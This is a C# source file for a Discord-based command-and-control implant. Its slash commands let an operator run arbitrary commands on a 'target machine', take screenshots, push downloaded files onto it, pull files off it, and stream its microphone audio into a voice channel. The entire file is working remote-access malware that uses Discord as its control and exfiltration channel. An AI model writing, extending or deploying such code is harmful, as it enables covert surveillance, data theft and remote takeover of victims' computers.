using Discord;
using Discord.Audio;
using Discord.Interactions;
using DiscordC2.Common;

public class DiscordC2SlashCommands : InteractionModuleBase<ShardedInteractionContext>
{
    public InteractionService Commands { get; set; }

    [SlashCommand("ping", "pong")]
    public async Task Ping(string id)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;

        await DeferAsync();
        await FollowupAsync($"{Utils.HostId} {Utils.MD5Hash(Utils.HostId)} alive");
    }

    [SlashCommand("screenshot", "take a screenshot of the target machine")]
    public async Task Screenshot(string id)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;
            
        await DeferAsync();
        await FollowupWithFileAsync(Utils.GetScreenshot(), "screenshot.png");
    }

    [SlashCommand("execute", "execute a command on the target machine")]
    public async Task Execute(string id, string command)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;

        await DeferAsync();
        string output = Utils.ExecuteCommandline(command);

        if (output == null)
        {
            await FollowupAsync("error");
        }

        if (output.Length > 2000-8) {
            IEnumerable<string> chunks = Utils.CommandOutputWrapper(output);
            foreach (string chunk in chunks)
            {
                await Context.Channel.SendMessageAsync(chunk);
            }
            await FollowupAsync("executed");
        } else {
            await FollowupAsync($"```\n{output}\n```");
        }
        
    }

    [SlashCommand("download", "download a file to the target machine")]
    public async Task Download(string id , string url, string filename)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;

        await DeferAsync();
        await FollowupAsync(Utils.DownloadFile(url, filename));
    }

    [SlashCommand("upload", "upload a file from the target machine")]
    public async Task Upload(string id, string path)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;
        
        await DeferAsync();

        var filename = Environment.ExpandEnvironmentVariables(path);
        if (File.Exists(filename))
            await FollowupWithFileAsync(filename);
        else
            await FollowupAsync("file not found");
    }

    [SlashCommand("join", "join a voice channel")] 
    public async Task JoinChannel(string id, IVoiceChannel? channel = null)
    {
        if (id.Trim() != Utils.MD5Hash(Utils.HostId))
            return;
        await DeferAsync();

        // check if already connected
        if (Context.Guild.CurrentUser.VoiceChannel != null) { await FollowupAsync("already connected"); return; }

        // Connect to channel
        channel ??= (Context.User as IGuildUser)?.VoiceChannel;
        if (channel == null) { await FollowupAsync("User must be in a voice channel, or a voice channel must be passed as an argument."); return; }
        await FollowupAsync("connected");

        // Transmit Audio
        var audioClient = await channel.ConnectAsync();
        var stream = audioClient.CreatePCMStream(AudioApplication.Voice);
        try 
        {
            Voice.GetAudioStream(stream);
        } 
        finally 
        {
            await stream.FlushAsync();
        }
        
    }

    [SlashCommand("leave", "leave a voice channel")] 
    public async Task LeaveChannel()
    {
        await DeferAsync();
        if (Context.Guild.CurrentUser.VoiceChannel == null) { await FollowupAsync("not in a voice channel"); return; }
        Voice.StopAudioStream();
        await Context.Guild.CurrentUser.VoiceChannel.DisconnectAsync();
        await FollowupAsync("disconnected");
    }

}